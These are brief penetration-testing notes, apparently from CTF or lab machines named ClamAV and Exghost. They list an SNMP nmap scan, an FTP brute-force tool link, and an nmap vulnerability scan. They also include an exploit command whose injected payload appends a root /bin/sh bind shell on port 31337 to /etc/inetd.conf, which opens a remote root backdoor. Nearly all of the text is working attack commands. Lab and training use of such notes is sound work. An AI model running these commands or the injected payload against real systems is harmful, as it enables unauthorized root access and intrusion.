
#### ClamAV => SNMP 
```
nmap -sU -p161 --script *snmp* $target
perl 4761.pl $target    # <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf">
```

#### Exghost => FTP 
Try = https://github.com/rix4uni/FTPBruteForce.git 


Use to look for exploits: 
` sudo nmap -sVC -vvv {{TARGET_IP}} --script vuln `
